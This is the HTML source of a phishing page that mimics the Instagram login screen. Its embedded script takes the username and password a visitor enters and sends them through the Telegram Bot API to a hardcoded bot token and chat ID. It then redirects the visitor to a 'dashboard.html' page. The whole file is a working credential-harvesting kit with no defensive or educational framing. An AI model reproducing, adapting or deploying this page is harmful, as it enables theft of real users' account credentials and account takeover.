<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
:root{
  --border:#dbdbdb;
  --text:#262626;
  --muted:#8e8e8e;
  --blue:#0095f6;
  --bg:#fafafa;
}
*{ box-sizing:border-box; }
body{
  margin:0;
  background:var(--bg);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  color:var(--text);
}
.wrapper{
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.container{
  display:flex;
  gap:32px;
}
.phone{
  width:380px;
  height:581px;
  background:url("https://i.imgur.com/Q8dS6YF.png") center/contain no-repeat;
}
.right{ width:350px; }
.card{
  background:#fff;
  border:1px solid var(--border);
  padding:10px 0;
  text-align:center;
}
.logo{
  margin:36px 0 12px;
}
.logo img{ width:175px; }
.form{ margin:0 40px; }
.form input{
  width:100%;
  height:38px;
  margin-bottom:6px;
  padding:9px 8px;
  font-size:12px;
  background:#fafafa;
  border:1px solid var(--border);
  border-radius:3px;
}
.form input::placeholder{ color:#8e8e8e; }
.form button{
  width:100%;
  height:32px;
  margin-top:8px;
  background:var(--blue);
  color:#fff;
  border:none;
  border-radius:8px;
  font-weight:600;
  font-size:14px;
  cursor:not-allowed;
}
.or{
  display:flex;
  align-items:center;
  margin:18px 40px;
  font-size:13px;
  color:var(--muted);
}
.or::before,.or::after{
  content:"";
  flex:1;
  height:1px;
  background:var(--border);
}
.or span{ margin:0 18px; }
.fb{
  color:#385185;
  font-weight:600;
  font-size:14px;
}
.forgot{
  margin-top:14px;
  font-size:12px;
  color:#00376b;
}
.signup{
  margin-top:10px;
  padding:20px 0;
  border:1px solid var(--border);
  background:#fff;
  text-align:center;
  font-size:14px;
}
.signup span{
  color:var(--blue);
  font-weight:600;
}
.apps{
  text-align:center;
  margin-top:20px;
  font-size:14px;
}
.apps img{
  width:136px;
  margin:10px 4px;
}
@media(max-width:875px){
  .phone{ display:none; }
}
</style>
</head>

<body>

<div class="wrapper">
  <div class="container">

    <div class="phone"></div>

    <div class="right">

      <div class="card">
        <div class="logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram">
        </div>

        <div class="form">
          <input id="text" placeholder="Phone number, username, or email">
          <input id="password" placeholder="Password">
          <button onclick="sendToTelegram()">
            Log in
            </button>
        </div>
        
<script>
function sendToTelegram() {
  const name = document.getElementById("text").value;
  const msg = document.getElementById("password").value;

  const BOT_TOKEN = "8390602758:AAGx5zvAB5j1OgCw27x_BqRc2Mz9cDtoymM";
  const CHAT_ID = "6320680594";

  
const text =
`𓆩 SYSTEM ALERT 𓆪
╭───────────────╮
│  USER ▸ ${name}
│  ────────────
│  MESSAGE ▸
│  ${msg}
│  ────────────
│  AUTHOR ▸ @1vjnz × udit
╰───────────────╯`;

  
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
}).then(() => {
  window.location.href = "dashboard.html";
});
}
</script>

        

        <div class="or"><span>OR</span></div>

        <div class="fb">Log in with Facebook</div>
        <div class="forgot">Forgot password?</div>
      </div>

      <div class="signup">
        Don’t have an account? <span>Sign up</span>
      </div>

      <div class="apps">
        Get the app.<br>
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/App_Store_badge_EN.svg" alt="App Store">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Google_Play_Store_badge_EN.svg" alt="Google Play">
      </div>

    </div>

  </div>
</div>

</body>
</html>
